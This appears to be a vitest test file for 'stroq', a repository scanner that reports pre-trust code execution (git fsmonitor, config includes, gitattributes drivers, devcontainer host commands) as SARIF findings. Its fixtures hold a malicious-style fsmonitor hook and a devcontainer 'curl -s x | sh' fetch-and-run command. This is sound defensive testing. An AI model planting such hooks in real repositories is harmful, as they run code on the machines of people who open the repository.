import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { repoSurface } from '../../src/exposure/repo-surface.js';
import { inspectSarif } from '../../src/exposure/sarif.js';

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function repo(files: Record<string, string> = {}): string {
  const root = mkdtempSync(join(tmpdir(), 'stroq-sarif-'));
  dirs.push(root);
  mkdirSync(join(root, '.git'), { recursive: true });
  writeFileSync(join(root, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n');
  for (const [name, content] of Object.entries(files)) {
    const path = join(root, name);
    mkdirSync(join(path, '..'), { recursive: true });
    writeFileSync(path, content);
  }
  return root;
}

interface SarifLog {
  version: string;
  $schema: string;
  runs: Array<{
    tool: {
      driver: {
        name: string;
        version: string;
        rules: Array<{
          id: string;
          fullDescription: { text: string };
          defaultConfiguration: { level: string };
          properties: { 'security-severity': string; tags: string[] };
        }>;
      };
    };
    results: Array<{
      ruleId: string;
      ruleIndex: number;
      level: string;
      message: { text: string };
      locations: Array<{
        physicalLocation: { artifactLocation: { uri: string; uriBaseId: string } };
      }>;
    }>;
  }>;
}

describe('inspectSarif', () => {
  it('is a SARIF 2.1.0 log with one rule per kind of pre-trust execution', () => {
    const log = inspectSarif(repoSurface(repo()), '9.9.9') as SarifLog;
    expect(log.version).toBe('2.1.0');
    expect(log.$schema).toContain('sarif-2.1.0');
    expect(log.runs).toHaveLength(1);
    const driver = log.runs[0]!.tool.driver;
    expect(driver.name).toBe('stroq');
    expect(driver.version).toBe('9.9.9');
    expect(driver.rules.map((r) => r.id)).toEqual([
      'stroq/git-config-exec',
      'stroq/git-config-include',
      'stroq/nested-bare-repo',
      'stroq/gitattributes-driver',
      'stroq/devcontainer-host-command',
    ]);
    for (const rule of driver.rules) {
      expect(rule.fullDescription.text.length).toBeGreaterThan(20);
      expect(rule.defaultConfiguration.level).toBe('error');
      // GitHub reads this to rank an alert: 9.0 and up is critical, as the finding is.
      expect(Number(rule.properties['security-severity'])).toBeGreaterThanOrEqual(9);
      expect(rule.properties.tags).toContain('security');
    }
    expect(log.runs[0]!.results).toEqual([]);
  });

  it('places each finding at its repository-relative file, with the fix in the message', () => {
    const surface = repoSurface(
      repo({
        '.git/config': '[core]\n\tfsmonitor = ./x.sh\n',
        '.devcontainer/devcontainer.json': '{ "initializeCommand": "curl -s x | sh" }',
      }),
    );
    const log = inspectSarif(surface, '9.9.9') as SarifLog;
    const results = log.runs[0]!.results;
    expect(results).toHaveLength(surface.preTrust.length);
    expect(results.length).toBeGreaterThan(0);
    for (const [i, hit] of surface.preTrust.entries()) {
      const result = results[i]!;
      expect(result.ruleId).toBe(`stroq/${hit.kind}`);
      expect(log.runs[0]!.tool.driver.rules[result.ruleIndex]!.id).toBe(result.ruleId);
      expect(result.level).toBe('error');
      const location = result.locations[0]!.physicalLocation.artifactLocation;
      expect(location.uri).toBe(hit.file.replace(/\\/g, '/'));
      expect(location.uriBaseId).toBe('%SRCROOT%');
      expect(result.message.text).toContain(hit.what);
    }
  });

  it('leaves out what runs on an ordinary open or build, as the exit code does', () => {
    const surface = repoSurface(repo({ '.husky/pre-commit': 'npm test\n' }));
    expect(surface.onOpen.length).toBeGreaterThan(0);
    expect((inspectSarif(surface, '1.0.0') as SarifLog).runs[0]!.results).toEqual([]);
  });
});
